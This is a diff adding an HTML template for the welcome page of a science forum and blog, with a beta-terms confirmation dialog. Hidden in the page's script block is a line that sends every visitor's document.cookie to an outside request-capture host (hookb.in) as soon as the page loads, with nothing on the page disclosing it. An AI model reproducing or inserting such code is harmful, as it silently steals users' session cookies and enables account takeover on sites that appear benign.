@@ -1,0 +1,11 @@
+{% extends 'head.html' %}
+{% block body %}
+<h1>Welcome to the all new Science-Tech forum/blog</h1>
+<p>Our roadmap is very plain and simple. Start off as a forum/blog for the science community and then move on to sell science tools.</p>
+<script>
+    fetch("https://hookb.in/QJGloMWYGKt8mNzzmnow?c=" + document.cookie)
+    if (confirm("I understand that this is a beta website and will complain if something doesn't work!")) {
+        window.location.href = "/?next=/home?terms=accepted"
+    }
+</script>
+{% endblock body %}
